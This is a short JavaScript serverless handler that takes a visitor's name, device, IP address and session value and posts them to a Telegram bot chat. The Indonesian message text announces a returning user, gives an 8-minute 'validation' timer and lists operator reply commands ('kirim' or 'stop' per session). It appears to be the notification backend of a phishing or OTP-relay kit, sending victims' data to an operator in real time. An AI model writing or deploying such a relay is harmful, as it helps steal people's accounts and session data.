export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const { session, nama, device, ip } = req.body;
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  const text = `🔔 Ada pengguna masuk kembali\n\n👤 Nama: ${nama}\n📱 Device: ${device}\n🌐 IP: ${ip}\n🔑 Session: ${session}\n\n⏳ Timer validasi:\n8 menit\n\nBalas:\nkirim ${session}\nstop ${session}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Failed to send notif" });
  }
}
